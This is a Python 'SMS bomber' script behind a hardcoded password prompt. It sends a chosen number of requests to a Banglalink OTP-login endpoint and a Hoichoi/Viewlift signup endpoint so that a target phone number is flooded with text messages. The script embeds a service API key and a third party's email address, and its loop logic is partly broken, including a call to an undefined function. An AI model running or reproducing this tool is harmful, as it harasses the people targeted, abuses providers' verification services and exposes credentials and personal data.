import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
os.system('clear')
line=yellow+"======================================================================================================================"
space=" "
logo=green+str("""
   ╔═════════════════════════════════╗
   ║ Author.  : TaNviR-AhMeD-RiYaD   ║
   ║ Facebook : MrTaNviiR            ║
   ║ GitHub   : TaNviiR-RiiYaD       ║
   ╚═════════════════════════════════╝
       
 
                                                  
""")

      
 #HEADER                
text=cyan+"\t\tCreated  By : TaNviiR-RiiYaD"+green+"\n\n\t\t★★ Crazy DeveLoper ★★   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)
#SECURITY				
header()
print("---------------------------------------")
print("Your need to Login Befor Use The Tools")
print("---------------------------------------")
n=2
while n==2:
		a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
		b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
		if a=="inbox" and b=="killer":
			print(green+"\n\n\t\t[ √ ] Correct")
			n=3
		else:
			
			print(red+"\n\n\t\t[ × ] Wrong Try Again")
			n=2
			
			os.system('clear')
			header()


#MAIN_TOOL
os.system('clear')
tt=1
header()	
while tt<2:
		os.system('clear')
		header()
		number=str(input(blue+"\n\n [>] Enter Your Target Number : "+yellow))
		ammount=int(input(blue+"\n [>] Enter The Ammount : "+yellow))
		os.system('clear')
		notice=cyan+"\n\t   [•]  Tools is Runing......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yyy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
					headers = CaseInsensitiveDict()
					headers["Host"] = "prod-api.viewlift.com"
					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
					headers["Accept"] = "application/json, text/plain, */*"
					headers["Accept-Language"] = "en-US,en;q=0.5"
					headers["Accept-Encoding"] = "gzip, deflate, br"
					headers["Content-Type"] = "application/json"
					headers["Content-Length"] = "128"
					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
					headers["Origin"] = "https://www.hoichoi.tv"
					headers["Referer"] = "https://www.hoichoi.tv/"
					headers["Connection"] = "keep-alive"
					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
					r= requests.post(url, headers=headers, data=data)
												
				if ammount2==1:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(0.01)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t  ★★TaNviiR★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(0.01)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t★★★HoicHoi SMS Tools★★★   \n" 
		header()
		opt()